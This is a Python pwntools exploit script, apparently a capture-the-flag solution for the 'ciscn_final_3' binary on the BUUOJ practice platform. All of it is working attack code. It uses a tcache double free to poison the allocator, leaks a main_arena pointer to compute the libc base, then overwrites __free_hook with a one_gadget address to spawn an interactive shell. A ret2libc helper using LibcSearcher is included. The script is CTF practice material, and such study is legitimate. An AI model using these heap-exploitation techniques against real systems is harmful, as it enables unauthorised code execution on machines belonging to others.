from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(arch='amd64', os='linux', log_level = 'DEBUG')
binary = './ciscn_final_3'
elf = ELF(binary)
p = remote('node3.buuoj.cn',29678) if argv[1]=='r' else process(binary)

# start
cnt = 0
def add(size, content='a'):
	global cnt,sla,sa,ru,r
	sla('> ', '1')
	sla('index\n', str(cnt))
	cnt += 1
	sla('size\n', str(size))
	sa('thing\n', content)
	ru('0x')
	return int(r(12), 16)

def remove(index):
	global sla
	sla('> ', '2')
	sla('index\n', str(index))

chunk0 = add(0x78)
add(0x18)
for i in range(10):
	add(0x78)
remove(11)
remove(11)
add(0x78,p64(chunk0-0x10)) # chunk11->fd = chunk0-0x10
add(0x78,p64(chunk0-0x10))
add(0x78,p64(0)+p64(0x4a1))
remove(0) # unsorted bin
remove(1) # tcache[0]
add(0x78) # chunk0; chunk1->fd = main_arena
add(0x18) # chunk1
main_arena = add(0x18)
base = main_arena - 0x3ebca0
leak('base', base)
libc = ELF('./libc.so.6')
free_hook = base + libc.sym['__free_hook']
one_gadget = base + 0x10a38c

add(0x28)
remove(18)
remove(18)
add(0x28, p64(free_hook))
add(0x28, p64(free_hook))
add(0x28, p64(one_gadget))
remove(0)
# end

itr()
